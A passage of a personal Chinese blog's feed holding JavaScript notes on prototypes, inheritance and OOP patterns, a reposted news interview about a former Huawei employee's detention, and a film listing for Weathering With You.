data-src="https://img-blog.csdn.net/20170804133139604?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM4MjgzMTU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></p><p>返回的是Person对象，但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Writer.prototype&#x3D;&#x3D;&#x3D;Person&#x2F;&#x2F;false  new Person()当然不等于Person</span><br></pre></td></tr></table></figure><p><strong>自我理解是Writer继承new Person()提供的Person方法和属性后就与Person脱离关系</strong> <br>这也是为啥不直接用<code>Writer.prototype=Person.prototype</code> <br>到此Writer的实例就可以使用Person的原型方法了</p><p>分析：<strong><code>Writer.prototype=Object.create(Person.prototype);</code></strong></p><p>Object.create(proto, [ propertiesObject ])函数创建一个指定原型且可选择性地包含指定属性的对象 <br>可以先肤浅的认为和<strong><code>Writer.prototype=new Person()</code></strong>效果一样 <br>分析：<strong><code>Writer.prototype.constructor=Writer;</code></strong></p><p>如果缺少这句就有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Writer&#x3D;&#x3D;&#x3D;writer.constructor&#x2F;&#x2F;false</span><br><span class="line">writer.constructor&#x3D;&#x3D;&#x3D;Person&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>因为Writer的原型的构造器是Person,但是缺少这句并不影响继承</p><p>之所以不影响继承是因为实例writer继承的方法和属性有：</p><ul><li><strong>构造器原型的方法、属性</strong></li><li><p><strong>原型链上的方法、属性</strong></p><p>虽然实例writer的构造器是 Person,Person没有Writer添加的原型方法、属性，但是writer的原型链指向Writer的原型</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">writer.__proto__&#x3D;&#x3D;&#x3D;Writer.prototype&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>所以writer就有了introduce方法和init属性</p><h2 id="3、写在后面"><a href="#3、写在后面" class="headerlink" title="3、写在后面"></a>3、写在后面</h2><pre><code>纯属个人理解，有问题请不要留情</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;js-原型继承分析&quot;&gt;&lt;a href=&quot;#js-原型继承分析&quot; class=&quot;headerlink&quot; title=&quot;js 原型继承分析&quot;&gt;&lt;/a&gt;js 原型继承分析&lt;/h1&gt;&lt;h2 id=&quot;1、继承上下文&quot;&gt;&lt;a href=&quot;#1、继承上下文&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="js" scheme="https://www.nikoyu.asia/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JS 原型、原型链、构造器关系</title>
    <link href="https://www.nikoyu.asia/JS-%E5%8E%9F%E5%9E%8B%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E5%85%B3%E7%B3%BB.html"/>
    <id>https://www.nikoyu.asia/JS-%E5%8E%9F%E5%9E%8B%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E5%85%B3%E7%B3%BB.html</id>
    <published>2019-12-04T06:06:50.000Z</published>
    <updated>2020-09-17T03:20:45.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js-原型、原型链、构造器关系"><a href="#js-原型、原型链、构造器关系" class="headerlink" title="js 原型、原型链、构造器关系"></a>js 原型、原型链、构造器关系</h1><p>写在前面</p><ul><li>已实例化的对象只有__proto__属性</li><li>未实例化的对象有prototype和__proto__属性</li><li>构造器是prototype对象的一个属性</li></ul><p>上图 <br> <img alt="这里写图片描述" title data-src="https://img-blog.csdn.net/20170801164359406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM4MjgzMTU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"> <br>测试走起</p><h2 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1.普通函数"></a>1.普通函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function A(x)&#123;</span><br><span class="line">    this.x&#x3D;x;</span><br><span class="line">&#125;</span><br><span class="line">console.log(A.prototype.constructor)&#x2F;&#x2F;function A()</span><br><span class="line">console.log(A.prototype.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(A.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>函数原型(prototype)的构造器(constructor)指向构造函数自身</li><li>函数原型的原型链(__proto__)指向Object的原型(prototype)</li><li>函数对象的原型链指向Function(所有函数对象的爸爸)的原型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function A(x)&#123;</span><br><span class="line">    this.x&#x3D;x;</span><br><span class="line">&#125;</span><br><span class="line">var A1&#x3D;new A(1);</span><br><span class="line">console.log(A1.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(A1.__proto__.constructor)&#x2F;&#x2F;function A()</span><br><span class="line">console.log(A1.constructor)&#x2F;&#x2F;function A()</span><br></pre></td></tr></table></figure><ul><li>函数实例的原型链(__proto__)指向其构造函数的原型(prototype)</li><li><p>函数实例的构造器就是其构造函数</p></li></ul><h2 id="2-对象函数"><a href="#2-对象函数" class="headerlink" title="2.对象函数"></a>2.对象函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(Object.prototype.constructor)&#x2F;&#x2F;function Object()</span><br><span class="line">console.log(Object.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>对象函数原型(prototype)的构造器(constructor)指向对象构造函数自身</li><li>当然Function也是Object他爸</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var obj&#x3D;new Object();</span><br><span class="line">obj&#x3D;&#123;</span><br><span class="line">    a:&#39;a&#39;,</span><br><span class="line">    b:&#39;b&#39;</span><br><span class="line">&#125;</span><br><span class="line">console.log(obj.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(obj.__proto__.constructor)&#x2F;&#x2F;function Object()</span><br><span class="line">console.log(obj.constructor)&#x2F;&#x2F;function Object()</span><br></pre></td></tr></table></figure><ul><li>对象的原型链(__proto__)指向对象函数的原型(prototype)</li><li><p>对象的构造器(constructor)是对象函数</p></li></ul><h2 id="3-Function函数"><a href="#3-Function函数" class="headerlink" title="3.Function函数"></a>3.Function函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(Function.prototype.constructor)&#x2F;&#x2F;function Function() </span><br><span class="line">console.log(Function.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(Function.prototype.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>Function的构造器(constructor)指向Function</li><li>Function的原型链(__proto__)指向Function的原型(prototype)</li><li><p>Function原型的原型链(__proto__)指向Object的原型(prototype)</p><h2 id="4-归于虚无"><a href="#4-归于虚无" class="headerlink" title="4.归于虚无"></a>4.归于虚无</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(Object.prototype.__proto__&#x3D;&#x3D;&#x3D;null)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>Object原型(prototype)的原型链(__proto__)指向null</li></ul>                                    ]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;js-原型、原型链、构造器关系&quot;&gt;&lt;a href=&quot;#js-原型、原型链、构造器关系&quot; class=&quot;headerlink&quot; title=&quot;js 原型、原型链、构造器关系&quot;&gt;&lt;/a&gt;js 原型、原型链、构造器关系&lt;/h1&gt;&lt;p&gt;写在前面&lt;/p&gt;

&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="js" scheme="https://www.nikoyu.asia/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JS面向对象编程之：封装、继承、多态</title>
    <link href="https://www.nikoyu.asia/JS-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html"/>
    <id>https://www.nikoyu.asia/JS-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html</id>
    <published>2019-12-03T03:53:57.000Z</published>
    <updated>2020-09-17T03:20:45.600Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="JS面向对象编程之：封装、继承、多态"><a href="#JS面向对象编程之：封装、继承、多态" class="headerlink" title="JS面向对象编程之：封装、继承、多态"></a>JS面向对象编程之：封装、继承、多态</h1><p>&nbsp;最近在实习公司写代码，被隔壁的哥们吐槽说，代码写的没有一点艺术。为了让我的代码多点艺术，我就重新温故了《javascript高级程序设计》（其中几章），然后又看了《javascript设计模式》，然后觉得要写点心得体会，来整理自己所学的吧。以下是我个人见解，错了请轻喷，欢迎指出错误，乐于改正。</p><p><img alt width="474" height="262" data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731220533138-1790206129.png" class="lazyload"></p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp;&nbsp;一、封装</p><p>&nbsp; &nbsp; &nbsp; （1）封装通俗的说，就是我有一些秘密不想让人知道，就通过私有化变量和私有化方法，这样外界就访问不到了。然后如果你有一些很想让大家知道的东西，你就可以通过this创建的属性看作是对象共有属性和对象共有方法，这样别人知道你的公共的东西啦，不止如此，你还可以访问到类或对象自身的私有属性和私有方法。哇，这种权利好大呀，外面的公共的方法和属性，和内部的私有属性和方法都可以访问到，都有特权啦，因此就叫做特权方法了。看个例子就知道啦。</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731221941169-1981451310.png" class="lazyload"></p><p>类的内部this上定义的属性和方法自然就可以复制到新创建的对象上，成为对象公有化的属性和方法，又可以访问私有属性和私有方法，因此就叫特权方法。</p><p>这样调用就可以啦</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731222522778-478754452.png" class="lazyload"></p><p>&nbsp; &nbsp;&nbsp;&nbsp; （2）闭包实现的封装</p><p>　　闭包是有权访问另外一个函数作用域中变量的函数，即在一个函数内部创建另外一个函数。这时就可以将闭包作为创建对象的构造函数，这样它既是闭包又是可实例对象的函数。</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731230614356-1409630772.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;二、继承</p><p>　　（1）类</p><p>　　&nbsp;每个类有3个部分：1,是构造函数内的，是供实例化对象复制用的。2,是构造函数外的，直接通过点语法添加的，这是供类使用的，实例化对象是访问不到的。3,是类的原型中的，实例化对象可以通过其原型链简介地访问到，也是为供所有实例化对象所共有的。</p><p>&nbsp; &nbsp; &nbsp;（2）类式继承</p><p>&nbsp; &nbsp; &nbsp;通过子类的原型prototype对象实例化来实现的</p><p>　　<img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731231414903-1734538422.png" class="lazyload"></p><p>继承就是声明2个类，不过类式继承需要将第一个类的实例赋值给第二个类的原型。这段代码，在实现subClass继承superClass时是通过将superClass的实例赋值给subClass的原型prototype,所以subClass.prototype继承了superClass.</p><p><strong>缺点</strong>就是：一个子类的实例原型从父类构造函数中继承来的共有属性就会直接影响到其他子类。比如：</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731232427403-1713790397.png" class="lazyload"></p><p><strong>额外知识点</strong>：instanceof是通过对象的prototype链来确定这个对象是否是某个类的实例，而不关心对象与类的自身结构。</p><p>&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;（3）构造函数式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp;构造函数式继承是通过在子类的构造函数作用环境中执行一次父类的构造函数来实现的。</p><p>　　 &nbsp;&nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731233137638-668815399.png" class="lazyload"></p><p>SuperClass.call(this,id);是构造函数式继承的精华，call可以更改函数的作用环境。这个对SuperClass调用这个方法就是将子类中的变量子啊父类中执行一遍，由于父类中是给this绑定属性的，因此子类自然也就继承了父类的共有属性。由于这种类型的继承没有涉及原型prototype,所以父类的原型方法自然不会被子类继承，而如果要想被子类继承就必须要放在构造函数中。</p><p>　　（4）组合继承</p><p>&nbsp; &nbsp; 组合继承就是：类式继承+构造函数继承</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731234213216-1128265252.png" class="lazyload"></p><p>这里用例子来测试下</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731234539106-488093682.png" class="lazyload"></p><p>&nbsp;果然子类的实例中更改父类继承下来的引用类型属性如books,根本不会影响到其他实例，并且子类实例化过程中又能将参数传递到父类的构造函数中。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; （5）原型式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;原型式继承跟类式继承一样，父类对象book中的值类型的属性被复制，引用类型的属性被共有。</p><p>&nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802101645668-406639973.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; （6）寄生式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 通过在一个函数内的过渡对象实现继承并返回新对象的方式，称之为寄生式继承。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;寄生就像寄生虫一样寄托于某个对象内部生长。就是对原型继承的第二次封装，并且在这第二次封装过程中对继承的对象进行了扩展，这样新创建的对象不仅仅有父类中的属性和方法而且还添加了新的属性和方法。</p><p>看下下面的例子吧</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802102508778-920595923.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;（7）寄生组合式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 寄生组合式继承就是寄生式继承+构造函数式继承，</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802105736122-504725171.png" class="lazyload"></p><p>先创建了父类，还有父类的原型方法，然后创建子类，并在构造函数中实现构造函数式继承，然后又通过寄生式继承了父类 原型，最后又对子类添加了一些原型方法。</p><p>现在我们来测试一下</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802110120465-1702254787.png" class="lazyload"></p><p>显然不会出现子类调用之后，另一个子类的值被改变。在这里其中最大的改变是对子类原型的处理，被赋予父类原型的一个引用，这是一个对象。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;（8）多继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802112718090-303191191.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 通过这种方式对一个对象属性的复制继承，将多个父类(对象)的属性与方法拷贝给子类实现继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;三、多态</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 多态就是通过对传递的参数判断来执行逻辑，即可实现一种多态处理机制</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;下面就是这个例子，通过多态类，调用add运算方式，根据不同参数做运算</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802113538512-1706925925.png" class="lazyload"></p><p>&nbsp;</p><p>这就是面向对象的三种特性啦，封装、继承、多态，对原理的理解，能在看其他人的优秀代码的时候，有个很好的理解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;JS面向对象编程之：封装、继承、多态&quot;&gt;&lt;a href=&quot;#JS面向对象编程之：封装、继承、多态&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="面向对象" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
    
      <category term="js" scheme="https://www.nikoyu.asia/tags/js/"/>
    
      <category term="面向对象" scheme="https://www.nikoyu.asia/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
  <entry>
    <title>华为离职事件</title>
    <link href="https://www.nikoyu.asia/Huawei%20resignation.html"/>
    <id>https://www.nikoyu.asia/Huawei%20resignation.html</id>
    <published>2019-12-03T03:42:14.000Z</published>
    <updated>2020-09-17T03:20:45.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="华为被拘前员工谈离职：因部门业务造假"><a href="#华为被拘前员工谈离职：因部门业务造假" class="headerlink" title="华为被拘前员工谈离职：因部门业务造假"></a>华为被拘前员工谈离职：因部门业务造假</h1><p>　　一笔30万元的离职赔偿款反成“敲诈勒索金”，华为前员工李洪元遭到251天拘留一事正在持续发酵。</p><p>　　11月28日，有自媒体曝光了一份《刑事赔偿决定书》，将华为与一位前员工的陈年纠葛展现在了公众面前。</p><p>　　李洪元于2005年入职华为，2018年1月离职。因离职补偿金额与公司意见不一，双方经商谈同意给李洪元补发331576.73元离职补偿。</p><p>　　2018年3月，李洪元过去所在部门的秘书，通过私人账户向其转款304742.98元（税后金额，交易摘要为“离职金额补偿”）。</p><p>　　但在2018年12月16日，李洪元却因涉嫌敲诈勒索罪被深圳市公安局刑事拘留，并于2019年1月22日被逮捕。但最终因“犯罪事实不清、证据不足”，于2019年8月23日被释放，总共被羁押了251天。</p><p>　　此事一经曝光，便收获了外界无数的关注。大家怀疑李洪元是否因为要求离职补偿而被当初所在部门恶意构陷。</p><p>　　11月30日，李洪元在华为心声社区上发了一个帖子，名为《给任总的一封公开信》。其中写道：“今天网络上的舆情汹汹并不是我本意，我的确会向公司讨要说法，但绝不期望是以这种方式。”</p><p>　　12月1日下午，界面新闻采访了这位遭到拘留的当事人李洪元。他向界面新闻还原了他从华为离职当天到成为舆论中心的全过程。</p><p>　　截至发稿前，华为官方对此事暂无回应。</p><p>　　<strong>以下是采访内容：</strong></p><p>　　<strong>界面新闻：这件事是你自己主动曝光的吗？为什么8月被释放，现在才被曝光？</strong></p><p>　　李洪元：不是我主动曝光。我8月被释放，但拿到国家赔偿是在上周三。网上被曝光的是《刑事赔偿决定书》，那是上周才有的文件。</p><p>　　拿到赔偿后，我挺开心的，就把这份决定书分享到了华为离职员工维权群里，期望有人能帮忙发到华为心声内网，以恢复名誉。结果不知道是谁发到外面去了，我自己也非常着急。</p><p>　　<strong>界面新闻：能不能简要概括一下你在华为的经历？</strong></p><p>　　李洪元：2005年10月，我从浙江巨化集团离职，加入华为杭州，担任企业安全与存储产品线的研发，后来被调去呼和浩特和印度新德里做过市场和销售，还在网络能源产品线下面的营销工程部做过秘书。</p><p>　　我在华为的最后一个部门是太阳能逆变器业务部，这个部门的是相对公司主流程独立运营的。我带领一个八九人的小团队，负责业务流程梳理。</p><p>　　我刚入职华为的时候是15级，月薪9000，比我当时2000块的月薪高很多，所以我来了。这十二年来我的收入成倍增长(公司没有亏待我，也是我举报的动力)，但职级一直没变过。</p><p>　　从2008年开始，我成为了华为的持股员工，有一点点股份，能拿到一点点分红。2018年1月，我从华为离职。</p><p>　　<strong>界面新闻：你为什么从华为离职？</strong></p><p>　　李洪元：<strong>我当时所在的逆变器业务，是一个通过政府补贴而存在的行业。销售毛利低，想要赚钱只能把规模做大。部门业务造假很早就开始了，公司大量资金被占用、仓储、存货方面都承担着巨额损失。出于我对华为的感情来说，我觉得我必须要把这股歪风给遏制住，所以我就在2016年11月举报了。</strong></p><p>　　举报之后我就明显感觉到主管开始针对我，比如他不批我的出差，又比如我手下的人离职，我要补人，但他也不允许把我看中的人调进来。</p><p>　　这时候接近2017年年底，到了我续签合同的时候了（华为员工合同四年一签），我还是想留在华为的，但主管就直接和我说，公司不和我续签了。</p><p>　　我尊重公司的选择，但是因为我入职12年了，按劳动法的规定，入职10年以上是可以签无固定期限劳动合同的，公司应遵从劳动法给予赔偿。</p><p>　　<strong>界面新闻：赔偿具体是怎么谈的？</strong></p><p>　　李洪元：是在2018年1月31号，网络能源产品线的HR的何某来跟我谈，给出的方案是N+1（含<a href="http://money.163.com/baike/nianzhongjiang/" target="_blank" title="财经事件_年终奖">年终奖</a>），我不认同这个方案，提出了2N，最后他们很爽快的答应了，双方签署了离职协议。</p><p>　　谈判过程长达两个小时，中途有说有笑，我没有任何敲诈勒索的言辞，也没有提到之前举报的事情。</p><p>　　<strong>界面新闻：最终你收到了多少赔偿？</strong></p><p>　　李洪元：2018年3月8日，我来深圳签了确认书，当天下午收到由何某秘书周某私人账户转来的大概30万元。</p><p>　　我疑惑过，为什么是私人账户，还曾打电话给60169（华为HR热线）询问原因，但对方说这是我们部门的事情，不归他们管。后来，我还向税务部门反映过这笔款项没交税的问题，税务部门通知公司补缴税款。</p><p>　　<strong>界面新闻：私人账户转账是否合理？目的是什么？</strong></p><p>　　李洪元：我不清楚，但我知道不下5位华为同事的离职赔偿都是通过这种方式得到的，我认为这是华为一种变通的处理方法。</p><p>　　<strong>界面新闻：这个赔偿与你们之前协商的数字符合吗？</strong></p><p>　　李洪元：相符。但当时答应我的年终奖没给，所以我在11月7日那天起诉了华为，我想拿回我的年终奖，总共20余万。</p><p>　　对于这件事，华为向法院拿出的一份1月22日的部门考评会议纪要，纪要上说我的绩效不好。华为称，这是不给我年终奖的原因。但这份会议纪要有诸多疑点。</p><p>　　<strong>界面新闻：你因为年终奖这件事起诉华为，是你被抓的导火索吗？</strong></p><p>　　李洪元：不清楚，但我在12月16号这天被抓了。</p><p>　　<strong>界面新闻：你等待起诉结果的这段时间，做了什么？</strong></p><p>　　李洪元：一直在看守所里，什么也做不了。</p><p>　　<strong>界面新闻：谈谈你被抓的过程吧。</strong></p><p>　　李洪元：被抓的时候我还在睡梦当中，家里被搜查了。警察告诉我，华为报了案，抓我的原因是我涉嫌职务侵占。但我到了派出所以后，我的罪名就变成了泄露商业机密。</p><p>　　<strong>界面新闻：你有过泄露商业机密的行为吗？</strong></p><p>　　李洪元：我认为我没有。</p><p>　　华为向警察出示的证据是，我曾经把华为系统内部的文件拷贝出去了，还说我打印了一些内部资料。我确实有把华为文件拷贝出去的行为，但我拷贝的都是给客户看的宣传资料，没有密级的，而且是得到了领导同意的。至于打印的资料，有成百份了，但都是工作需要。</p><p>　　<strong>界面新闻：你在之前的采访当中说，你妻子在4月份的时候提交了你和HR的录音，为什么直到这个时间点才交？</strong></p><p>　　李洪元：4月16日，检察官第一次来找我，我才得知华为的HR何某说我敲诈勒索30万，这是我被抓的原因。第二天我见到我的律师，让她转告我的妻子去找录音，并在4月把录音交给了检察机关。</p><p>　　<strong>界面新闻：4月就提交了证据，为什么8月你才被释放？</strong></p><p>　　李洪元：不清楚。其实在7月份的时候，何某就已经改口供了，他说我没有敲诈勒索。</p><p>　　<strong>界面新闻：从开始拘留到现在，你和华为有沟通吗？</strong></p><p>　　李洪元：没有任何沟通，我和我家人没去找过华为，华为现在也没来找过我。</p><p>　　<strong>界面新闻：被关押的251天你经历了什么？</strong></p><p>　　李洪元：思考今后的人生，与律师一起想办法。我母亲一个礼拜之内瘦了6斤，我爷爷在这期间去世了，我觉得这件事情对他也有刺激吧，没能见他最后一面很遗憾。</p><p>　　<strong>界面新闻：有人质疑你当初的举报动机不单纯。</strong></p><p>　　李洪元：社会的运行规律是主观为自己，客观为别人。通过为别人提供价值来实现自己的价值。举报这个事情本身对公司是有积极作用的，甚至某些时候还设置了奖励和对当事人的保护措施。因此想通过举报获得一个和高层对话的机会，并不违反道德和法律。</p><p>　　<strong>界面新闻：你现在还有什么诉求？</strong></p><p>　　李洪元：我还是希望和华为沟通，最好是任总能够亲自来和我沟通，就占用他老人家30分钟时间吧。毕竟之前与何总的沟通结果，一句不代表公司行为就作废了，我搞怕了。</p><p>　　<strong>界面新闻：有什么之后的打算？</strong></p><p>　　李洪元：正在准备创业，为以后我们国家能少发生这类事尽一点薄力。</p><p>　　稿源：界面新闻</p><p>　　<strong>后续：华为回应：支持李洪元运用法律武器维护自己的权益</strong></p><p>　　华为前员工李洪元离职后被起诉敲诈勒索，羁押251天后，因犯罪事实不清、证据不足释放。近日，李洪元接受多家媒体采访并表达了个人诉求。</p><p>　　对此，华为今天作出回应：华为有权利，也有义务，并基于事实对于涉嫌违法的行为向司法机关举报。我们尊重司法机关，包括公安、检察院和法院的决定。如果李洪元认为他的权益受到了损害，我们支持他运用法律武器维护自己的权益，包括起诉华为。这也体现了法律面前人人平等的法治精神。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;华为被拘前员工谈离职：因部门业务造假&quot;&gt;&lt;a href=&quot;#华为被拘前员工谈离职：因部门业务造假&quot; class=&quot;headerlink&quot; title=&quot;华为被拘前员工谈离职：因部门业务造假&quot;&gt;&lt;/a&gt;华为被拘前员工谈离职：因部门业务造假&lt;/h1&gt;&lt;p&gt;　　一笔30
      
    
    </summary>
    
    
      <category term="情感生活" scheme="https://www.nikoyu.asia/categories/%E6%83%85%E6%84%9F%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="HUAWEI" scheme="https://www.nikoyu.asia/tags/HUAWEI/"/>
    
  </entry>
  
  <entry>
    <title>天气之子</title>
    <link href="https://www.nikoyu.asia/windson.html"/>
    <id>https://www.nikoyu.asia/windson.html</id>
    <published>2019-12-01T03:55:59.000Z</published>
    <updated>2020-09-17T03:20:45.605Z</updated>
    
    <content type="html"><![CDATA[<img alt="天气之子" data-src=" /img/windSon.jpg" class="lazyload"><h1>        <span property="v:itemreviewed">天气之子 天気の子</span>            <span class="year">(2019)</span></h1><p>导演: 新海诚<br>编剧: 新海诚<br>主演: 醍醐虎汰朗 / 森七菜 / 小栗旬 / 本田翼 / 倍赏千惠子 / 更多…<br>类型: 爱情 / 动画 / 奇幻<br>官方网站: <a href="http://www.tenkinoko.com">www.tenkinoko.com</a><br>制片国家/地区: 日本<br>语言: 日语<br>上映日期: 2019-11-01(中国大陆) / 2019-07-19(日本)<br>片长: 111分钟 / 113分钟(中国大陆)<br>又名: Weathering With You / Weather Child / Weather’s Child / Child of Weather  </p><div style="pull-left">豆瓣评分  7.1  136604人评价5星 14.0% 4星 36.2% 3星 40.5% 2星 8.1% 1星 1.2% 好于 38% 动画片好于 52% 爱情片  我看过这部电影 2019-11-15    我的评价:           力荐 标签:奇幻 2019 动漫 爱情 动画 青春 治愈 日本 動漫 神作   神作 !!! 全程泪点不断~ 浪漫虚幻风爱情电影   写短评   写影评 添加到豆列 分享到   推荐  天气之子的剧情简介 · · · · · ·  </div><br><br><div style="pull-right"><img height="800" width="600" data-src="/img/wind2.jpg" class="lazyload"></div>  <br><br>　　高一那年夏天，帆高（醍醐虎汰朗配音）离开位在离岛的家乡，独自一人来到东京，拮据的生活迫使他不得不找份工作，最后来到一间专门出版奇怪超自然刊物的出版社担任写手。不久，东京开始下起连日大雨，仿佛暗示着帆高不顺遂的未来，在这座繁忙城市里到处取材的帆高邂逅了与弟弟相依为命，不可思议的美少女阳菜（森七菜配音）。「等等就会放晴了喔。」阳菜这样告诉着帆高，不久，头顶的乌云逐渐散去，耀眼的阳光洒落街道……原来，阳菜拥有「改变天气」的奇妙能力……天气之子的演职员 · · · · · ·  <p>新海诚        森七菜               小栗旬              本田翼                  倍赏千惠子<br>导演         配 天野阳菜            配音                配音                     配音  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img alt=&quot;天气之子&quot; data-src=&quot; /img/windSon.jpg&quot; class=&quot;lazyload&quot;&gt;
&lt;h1&gt;
        &lt;span property=&quot;v:itemreviewed&quot;&gt;天气之子 天気の子&lt;/span&gt;
            &lt;sp
      
    
    </summary>
    
    
      <category term="情感生活" scheme="https://www.nikoyu.asia/categories/%E6%83%85%E6%84%9F%E7%94%9F%E6%B4%BB/"/>
    
